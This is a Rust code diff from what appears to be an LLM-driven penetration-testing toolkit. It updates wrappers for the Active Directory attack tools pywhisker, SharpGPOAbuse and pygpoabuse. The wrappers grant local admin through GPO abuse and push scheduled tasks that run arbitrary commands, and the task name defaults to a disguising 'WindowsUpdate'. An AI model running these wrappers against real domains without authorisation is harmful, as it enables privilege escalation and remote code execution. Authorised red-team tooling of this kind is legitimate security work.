@@ -189,7 +189,7 @@ pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
     let target_sam = required_str(args, "target_samaccountname")?;
     let action = optional_str(args, "action").unwrap_or("list");
 
-    CommandBuilder::new("pywhisker.py")
+    CommandBuilder::new("pywhisker")
         .flag("-d", domain)
         .flag("-u", username)
         .flag("-p", password)
@@ -230,22 +230,31 @@ pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
 // 8. SharpGPOAbuse
 // ---------------------------------------------------------------------------
 
-/// Abuse Group Policy Objects via `SharpGPOAbuse.exe`.
+/// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
 ///
-/// Required args: `gpo_name`, `user_to_add`
+/// Required args: `gpo_name`, `domain`, `username`, `password`, `dc_ip`, `user_to_add`
 /// Optional args: `action` (default: `"AddLocalAdmin"`), `computer_target`
 pub async fn sharpgpoabuse(args: &Value) -> Result<ToolOutput> {
     let gpo_name = required_str(args, "gpo_name")?;
-    let user_to_add = required_str(args, "user_to_add")?;
+    let domain = required_str(args, "domain")?;
+    let username = required_str(args, "username")?;
+    // SharpGPOAbuse uses integrated auth via domain/DC — password is required
+    // by the LLM schema for credential consistency but not passed to the binary.
+    let _password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let user_to_add = optional_str(args, "user_to_add").unwrap_or(username);
     let action = optional_str(args, "action").unwrap_or("AddLocalAdmin");
     let computer_target = optional_str(args, "computer_target");
 
     let action_flag = format!("--{action}");
 
-    CommandBuilder::new("SharpGPOAbuse.exe")
+    CommandBuilder::new("mono")
+        .arg("SharpGPOAbuse.exe")
         .arg(&action_flag)
         .flag("--UserAccount", user_to_add)
         .flag("--GPOName", gpo_name)
+        .flag("--Domain", domain)
+        .flag("--DomainController", dc_ip)
         .flag_opt("--ComputerTarget", computer_target)
         .timeout_secs(120)
         .execute()
@@ -258,25 +267,27 @@ pub async fn sharpgpoabuse(args: &Value) -> Result<ToolOutput> {
 
 /// Create an immediate scheduled task via GPO abuse with `pygpoabuse`.
 ///
-/// Required args: `domain`, `username`, `password`, `computer_target`, `task_name`, `command`
-/// Optional args: `force` (bool)
+/// Required args: `domain`, `username`, `password`, `gpo_id`, `command`, `dc_ip`
+/// Optional args: `task_name`, `force` (bool)
 pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
     let password = required_str(args, "password")?;
-    let computer_target = required_str(args, "computer_target")?;
-    let task_name = required_str(args, "task_name")?;
+    let gpo_id = required_str(args, "gpo_id")?;
     let command = required_str(args, "command")?;
-    let force = optional_bool(args, "force").unwrap_or(false);
+    let dc_ip = required_str(args, "dc_ip")?;
+    let task_name = optional_str(args, "task_name").unwrap_or("WindowsUpdate");
+    let force = optional_bool(args, "force").unwrap_or(true);
 
     let target = credentials::impacket_target(Some(domain), username, Some(password), domain);
 
     CommandBuilder::new("pygpoabuse")
         .arg(&target)
-        .flag("--target", computer_target)
-        .flag("--tasktitle", task_name)
-        .flag("--taskcommand", command)
-        .arg_if(force, "--force")
+        .flag("-gpo-id", gpo_id)
+        .flag("-command", command)
+        .flag("-taskname", task_name)
+        .flag("-dc-ip", dc_ip)
+        .arg_if(force, "-f")
         .timeout_secs(120)
         .execute()
         .await
